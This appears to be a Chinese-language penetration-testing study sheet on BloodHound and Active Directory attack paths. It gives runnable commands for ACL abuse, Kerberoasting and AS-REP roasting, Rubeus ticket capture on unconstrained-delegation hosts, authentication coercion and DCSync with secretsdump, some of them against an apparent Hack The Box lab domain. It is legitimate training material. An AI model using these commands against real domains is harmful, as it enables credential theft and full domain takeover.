# BloodHound

## 怎么看BloodHound图

### 1）节点(Node)=对象是谁？

（1）User：域用户、服务账号、管理员

改密码，强制改密码，那台机器登录过

（2）Computer：域内机器、域控

能不能登录它，有没有高权Session，是否UnConstrained Delegation

（3）Group：Domain Admins，自定义组

谁是成员，能不能把自己加进去

（4）Domain：整个AD域

我对Domain有没有ACL，有没有DCSync

（5）GPO/OU/Container（结构类）：规则、权限

权限继承，GPO提权

### 2）边（Edge）=我能对它做什么？

横向移动，ACL提权，Kerberos票据，终点DCSync,GetChangesAll



## 收集信息

### 收集参数

#### 	（1）身份验证参数

| 参数             | 意义             |
| ---------------- | ---------------- |
| -u               | 用户名           |
| -p               | 明文密码         |
| --hashes <LM:NT> | NTLM哈希         |
| -k               | Kerberos认证     |
| --aesKey         | Kerberos AES Key |

#### （2）采集参数

| 参数         | 类型                                                 |
| ------------ | ---------------------------------------------------- |
| -c All       | 全量采集                                             |
| -c Default   | 默认组合（Group、LocalAdmin、Session、Trusts）       |
| -c DCOnly    | 低噪音（Group、ACL、Trusts、ObjectProps、Container） |
| Group        | 用户-组-组关系                                       |
| ACL          | AD对象访问控制权限                                   |
| Trusts       | 域/林/外部信任关系                                   |
| Session      | 那个用户当前登录在那台主机                           |
| LocalAdmin   | 谁是那些主机的本地管理员                             |
| LoggedOn     | 当前/历史登录用户                                    |
| RDP          | 谁可以RDP登录那台主机                                |
| PSRemote     | 谁可以用PowerShell Remoting                          |
| 下DCOM       | DCOM执行权限                                         |
| Container    | OU/Container层级关系                                 |
| GPO          | GPO关联关系                                          |
| Experimental | 测试功能                                             |



#### （3）域/网络参数

| 参数             | 意义       |
| ---------------- | ---------- |
| -d DOMAIN        | 目标域     |
| -dc DC           | 指定域控   |
| -ns DNS          | 指定DNS    |
| --disable_autogc | 不自动找GC |

#### （4）输出/性能参数

| 参数            | 作用       |
| --------------- | ---------- |
| --zip           | 输出zip    |
| -w 10           | 并发worker |
| --outputdir DIR | 输出目录   |
| --verbose       | 调试输出   |



### 远程收集

bloodhound-python -c All -u <username> -p <password> -ns <dnsServerIp> -d <domain> -dc <domainControllerI> --zip

### 本地收集

#### （SharpHound.exe）Windows端 C#

BloodHound C#采集器，在域内Windows上跑。

常用命令 

（1）SharpHound.exe -c All

（2）SharpHound.exe -c Session,LocalAdmin

### SharpHound.ps1（PowerShell内存加载）

Import-Module .\SharpHound.ps1

Invoke-BloodHound -CollectMethod All

## 信息分析器

### 怎么使用

（1）启动Neo4j

​	sudo neo4j start

​	或

​	sudo systemctrl start neo4j

neo4j页面：`http://127.0.0.1:7474`

（2）BloodHound

​	sudo bloodhound

（3）导入数据

​	信息收集器，上传zip格式数据，如果收集是数据只有json格式，手动打包 zip -r bh.zip ./*.json

### 清空数据

Neo4j a12345677

（1）Neo4j Browser

​	http://127.0.0.1:7474

​	MATCH (n) DETACH DELETE n;

（2）重置Neo4j数据目录

​	sudo systemctl stop neo4j

​	sudo rm -rf /var/lib/neo4j/data/database/*

​	sudo systemctl start neo4j

（3）清空指定

	MATCH (n)
	WHERE toUpper(n.domain) = "STREAMIO.HTB"
	DETACH DELETE n;

## 验证对照

| BloodHound Edge/点 | 代表什么               | PowerView怎么查                              | 下一步常用命令                                            |
| ------------------ | ---------------------- | -------------------------------------------- | --------------------------------------------------------- |
| MemberOf           | 用户属于某组           | Get-DomainUser <user>                        | select -Expand MemberOf/Get-DomainGroupMember <SomeGroup> |
| AdminTo            | 我是某主机本地管理员   | Get-NetLocalGorupMember -ComputerName <HOST> | ?{$_.MemberName -match '<user>'}                          |
| HasSession         | 某用户当前在某机有会话 | Get-NetSession -computerName <HOST>          | 拿下Host抓凭据(LSASS/票据)                                |

## 横向移动

### （1）HasSession/LoggedOn（会话相关）

| BloodHound Edge | 代表                                | PowerView怎么查                     | 下一步思考        |
| --------------- | ----------------------------------- | ----------------------------------- | ----------------- |
| HasSession      | 用户在某主机上登录（交互/网络会话） | Get-NetSession -ComputerName <HOST> | 拿下Host 提取票据 |
| LoggedOn        | 更广义的登录信息（需要权限）        |                                     |                   |

拿下HOST的常见操作

AdminTo：evil-winrm/psexec.py

只有smb登录权：wmiexec.py/smbexec.py

### （2）CanRDP/CanPSRemote/ExecuteDCOM（远程登录/远程执行）

| Edge        | 代表                 | PowerView                                                    | 下一步思考                                             |
| ----------- | -------------------- | ------------------------------------------------------------ | ------------------------------------------------------ |
| CanRDP      | 可以RDP登录该主机    | 这类更多看本地组/策略：先查Get-NetLocalGroupMember -ComputerName <HOST> -GroupName <user> | mstsc /v:HOST                                          |
| CanPSRemote | 可PowerShellRemoting | 组/策略相关：可查wimRM是否开：端口/服务：权限看组策略/本地组 | Enter-PSSession -ComputerName <HOST> -Credential $cred |
| ExecuteDCOM | 可DCOM执行           | 通常比较复杂（组件权限+本地管理员）                          |                                                        |

### （3）ACL提权

| Edge                 | 代表                        | PowerView                                                    | 下一步                                                |
| -------------------- | --------------------------- | ------------------------------------------------------------ | ----------------------------------------------------- |
| GenericAll           | 我对目标对象“全控”          | Get-DomainObjectAcl -Identity <Target> -ResolveGUIDS \| ?{$_.SecurityIdentifier -match $mySid} | 目标是组；把自己加进组，目标是用户；改密码/加影子凭据 |
| GenericWrite         | 我能写目标对象部分属性      | 同上(查ACL)                                                  | 写SPN、写脚本路径、写登录属性->走kerberos/持久化      |
| WriteOwner           | 我能把对象Owner改成我       | 同上                                                         | 先改Owner->再给自己加WriteDACL/FullControl->          |
| WriteDacl            | 我能改变对象ACL（授权自己） | 同上                                                         | 给自己加GenericAll/FullControl->加组/改密码           |
| AddMember(对组)      | 我能往这个组加人            | 通常体现对该组对象的写权限                                   | 直接 Add-DomainGroupMember/net group                  |
| ForceChangePassdword | 我能强制重置某用户密码      | ACL里查对应GUID                                              | 直接重置该用户密码->用心密码登录横移                  |

### A）PowerView

#把自己加入某组

Add-DomainGroupMember -Identity "<targetGroup>" -Members "<xx\usr>" -Credential $cred

#强制修改用户密码

$pass = Converto-SecuryString '<password>' -AsPlainText -Force

Set-DomainUserPassword -Identity '<user>' -AccountPassword $pass -Credential $cred

### B）原生命令

net group "<Target_Group>" <user> /add /domain

net user <user> <pass> /domain

## 读敏感属性

| Edge             | 代表                             | PowerView                                                    | 下一步                                        |
| ---------------- | -------------------------------- | ------------------------------------------------------------ | --------------------------------------------- |
| ReadLAPS         | 能读某些机器的LAPS本地管理员密码 | Get-DomainComputer -Identity <HOST> -Properties ms-Mcs-AdmPwd | 用拿到的本地admin密码去登录本地机器 Winrm/SMB |
| ReadGMSAPassword | 能读gMSA密码                     |                                                              | 拿到gMSA凭据后横向移动/提权                   |

## Kerberos/委派相关

| Edge                                     | 代表                     | PowerView                                                    | 下一步                                                    |
| ---------------------------------------- | ------------------------ | ------------------------------------------------------------ | --------------------------------------------------------- |
| Kerberoastable（常见是用户带SPN）        | 可Kerberoast（离线爆破） | Get-DomainUser -SPN                                          | Linux:GetUserSPN.py domain/user:pass -request ->hashcat   |
| ASREPRoastable（Do not require preauth） | 可AS-REP Roast           | Get-DomainUser -PreauthNotRequired                           | Linux:GetNPUsers.py domain/ -usersfile users.txt -request |
| UnconstrainedDelegation（计算机）        | 主机是非约束委派         | Get-DomainComputer -UnConstrained                            | 思路：诱导高权访问该机->抓TGT/票据->提权                  |
| TrustedToAuthForDelegation               | 委派约束（S4U）相关      | Get-DomainUser -TrustedToAuth/Get -DomainComputer -TrustedToAuth | 思路：S4U2Self/S4U2Proxy                                  |

## 终点边：DCSync/GetChanges(直达域控)

| Edge                               | 代表                       | PowerView                     | 下一步                                             |
| ---------------------------------- | -------------------------- | ----------------------------- | -------------------------------------------------- |
| DCSync（GetChanges/GetChangesAll） | 你具备从DC拉取域哈希的权限 | 体现对域对象的复制权限（ACL） | Linux：secretsdump.py -just-dc domain/user:pass@DC |

## UnConstrainedDelegation 非约束委派



### A）被动等票

场景：你已经给你是WEB01本地管理员（或SYSTEM），且Web01是UnConstrainedDelagation。

要做的是：监听票据->等DA/管理员来连一下（SMB/WIMRM/RDP/计划任务都行）->抓取TGT

Step：

（1）在Web01上拿SYSTEM

（2）用Rebeus监听新票据

.\Rubeus.exe monitor /interval:5 /nowrap

（3）等待上钓：User、Service、Base64（TGT票据）

（4）把票据注入当前会话 .\Rubeus.exe ptt /ticket:<BASE64_TICKET>

（5）klist验证票据，看krbtgt票据还在

（6）尝试访问DC：dir \\\\DC01\\c$



### B）主动诱导（让DC/高权来敲门）

#### 1）强迫DC访问你这台（PrinterBug/Spooler系列）

核心：让DC（或高权机器）对你的UnConstrained主机发起认证（Kerberos），认证发生->TGT可能落到你的机器->你抓票

常见：

PrinterBug/SpoolSample

PetitPotam（常见NTLM/ADCS链）

Step：

（1）在Unconstraied主机先开

.\Rubeus.exe monitor /interval:5 /nowrap

（2）你能执行攻击的地方，触发DC对WEB01访问

（3）Rebues monitor里出现DC01$或administrator的TGT

（4）Rebus ptt->验证访问DC

### C）拿到票后提权

（1）直接远程访问DC

dir \\\\DC01\\C$

（2）DCSync（如果票据对应的主体具备复制权限，或你已是DA）

secretsdump.py -k -no-pass streamio.htb/Administrator@dc01.streamio.htb

用kerberos票据做secretdump

（3）Winrm和Smb横移

evil-winrm -i dc01 -u Administrator -p <password>

## BloodHound "Shortest Paths to UnConstarined Delegation Systems"

（1）我现在身份最快能控制那台UnConstrained主机

（2）一旦控制那台主机，后续进行抓票

## UnConstrainedDelegation利用流程

（1）Get-DomainComputer -UnConstrained

（2）拿下其中一台主机到admin/System

（3）Rebeus monitor

（4）等DA/DC来连or用coercion来诱导

（5）Rebeus ptt

（6）klist+\\\\dc\\c$验证

（7）走DCSync/横向

## 思考路径

1.先看自己的节点（所处的位置位置/组）

2.优先找两类边：

（1）能去那台机器：AdminTo/CanPSRemote/CanRDP/HasSession

（2）能改谁：GenericAll/WriteDACL/writeOwner/ForChangePassword/AddMember

（3）看到一条边，用PowerView验证一下

（4）验证成立，思考下一步拿权限

